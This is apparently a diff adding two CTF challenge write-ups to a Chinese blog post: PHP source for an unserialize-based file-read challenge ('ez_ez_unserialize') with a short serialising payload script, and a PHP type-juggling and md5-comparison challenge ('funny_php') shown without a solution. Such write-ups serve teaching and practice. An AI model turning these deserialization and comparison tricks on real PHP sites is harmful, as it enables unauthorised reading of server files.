@@ -412,3 +412,114 @@ base64 解密后是 tapcode
 记得把空格去掉, 不然解出来的明文会有缺失
 
 ![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210041232783.png)
+
+## ez_ez_unserialize
+
+```php
+<?php
+class X
+{
+    public $x = __FILE__;
+    function __construct($x)
+    {
+        $this->x = $x;
+    }
+    function __wakeup()
+    {
+        if ($this->x !== __FILE__) {
+            $this->x = __FILE__;
+        }
+    }
+    function __destruct()
+    {
+        highlight_file($this->x);
+        //flag is in fllllllag.php
+    }
+}
+if (isset($_REQUEST['x'])) {
+    @unserialize($_REQUEST['x']);
+} else {
+    highlight_file(__FILE__);
+}
+```
+
+payload
+
+```php
+<?php
+class X
+{
+    public $x = __FILE__;
+    function __construct($x)
+    {
+        $this->x = $x;
+    }
+    function __wakeup()
+    {
+        if ($this->x !== __FILE__) {
+            $this->x = __FILE__;
+        }
+    }
+    function __destruct()
+    {
+        highlight_file($this->x);
+        //flag is in fllllllag.php
+    }
+}
+
+$a = new X('fllllllag.php');
+echo serialize($a);
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201141148.png)
+
+## funny_php
+
+```php
+<?php
+    session_start();
+    highlight_file(__FILE__);
+    if(isset($_GET['num'])){
+        if(strlen($_GET['num'])<=3&&$_GET['num']>999999999){
+            echo ":D";
+            $_SESSION['L1'] = 1;
+        }else{
+            echo ":C";
+        }
+    }
+    if(isset($_GET['str'])){
+        $str = preg_replace('/NSSCTF/',"",$_GET['str']);
+        if($str === "NSSCTF"){
+            echo "wow";
+            $_SESSION['L2'] = 1;
+        }else{
+            echo $str;
+        }
+    }
+    if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
+        if($_POST['md5_1']!==$_POST['md5_2']&&md5($_POST['md5_1'])==md5($_POST['md5_2'])){
+            echo "Nice!";
+            if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
+                if(is_string($_POST['md5_1'])&&is_string($_POST['md5_2'])){
+                    echo "yoxi!";
+                    $_SESSION['L3'] = 1;
+                }else{
+                    echo "X(";
+                }
+            }
+        }else{
+            echo "G";
+            echo $_POST['md5_1']."\n".$_POST['md5_2'];
+        }
+    }
+    if(isset($_SESSION['L1'])&&isset($_SESSION['L2'])&&isset($_SESSION['L3'])){
+        include('flag.php');
+        echo $flag;
+    }
+
+    
+?>
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201143669.png)
+
